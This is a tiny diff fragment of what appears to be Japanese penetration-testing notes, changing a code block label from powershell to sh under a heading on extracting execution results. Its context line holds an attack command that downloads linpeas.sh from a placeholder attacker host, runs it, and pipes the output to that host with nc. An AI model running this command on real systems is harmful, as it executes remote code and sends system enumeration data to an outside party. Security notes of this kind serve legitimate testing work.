@@ -49,7 +49,7 @@ curl <AttackerIP>:8888/linpeas.sh | sh | nc -q 0 <AttackerIP> 9002
 
 ### 実行結果抽出
 
-```powershell
+```sh
 
 ```
 
